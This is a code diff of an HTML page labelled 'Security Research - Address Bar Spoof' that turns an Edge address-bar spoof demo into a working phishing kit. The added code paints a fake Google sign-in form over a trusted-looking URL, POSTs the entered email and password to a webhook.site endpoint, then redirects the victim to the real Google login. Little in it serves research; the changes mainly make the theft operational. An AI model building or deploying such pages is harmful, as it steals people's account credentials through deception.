@@ -3,7 +3,6 @@
 <head>
     <title>Security Research - Address Bar Spoof</title>
     <style>
-        /* CSS to make the page look like a legitimate service */
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background-color: #f2f2f2;
@@ -22,10 +21,7 @@
             text-align: center;
             width: 350px;
         }
-        img {
-            width: 100px;
-            margin-bottom: 20px;
-        }
+        img { width: 92px; margin-bottom: 20px; }
         input {
             width: 100%;
             padding: 12px;
@@ -44,9 +40,7 @@
             cursor: pointer;
             font-weight: bold;
         }
-        button:hover {
-            background-color: #357ae8;
-        }
+        button:hover { background-color: #357ae8; }
     </style>
 </head>
 <body>
@@ -58,24 +52,42 @@
     </div>
 
     <script>
+        function captureAndSave() {
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('pass').value;
+
+            // PASTE YOUR WEBHOOK URL HERE
+            const webhookUrl = 'https://webhook.site/6434d8ca-3493-47ea-a4a7-9372cbc125ef';
+
+            // Sending the data to your "data.txt" equivalent
+            fetch(webhookUrl, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: `Email: ${email} | Password: ${pass}`
+            }).then(() => {
+                alert("Data sent to Webhook.site!");
+                window.location.href = "https://accounts.google.com";
+            });
+        }
+
         function spoof() {
-            // 1. The Trigger: Non-existent port on a trusted domain
+            // Trigger the browser hang
             window.location = "https://www.google.com:8080";
 
-            // 2. The Content Loop: Repeatedly writing the UI
-            // In vulnerable Edge, this overwrites the display while keeping the URL
             setInterval(function() {
-                document.body.innerHTML = `
-                    <div class="login-card">
-                        <img src="https://via.placeholder.com/100" alt="Logo">
-                        <h2>Sign in</h2>
-                        <p>Use your Google Account</p>
-                        <input type="text" placeholder="Email or phone">
-                        <input type="password" placeholder="Enter your password">
-                        <button onclick="alert('Data Captured!')">Next</button>
-                    </div>
-                `;
-            }, 10);
+                if (!document.getElementById('email')) {
+                    document.body.innerHTML = `
+                        <div class="login-card">
+                            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
+                            <h2>Sign in</h2>
+                            <p>Use your Google Account</p>
+                            <input type="text" id="email" placeholder="Email or phone">
+                            <input type="password" id="pass" placeholder="Enter your password">
+                            <button onclick="captureAndSave()">Next</button>
+                        </div>
+                    `;
+                }
+            }, 100);
         }
     </script>
 </body>
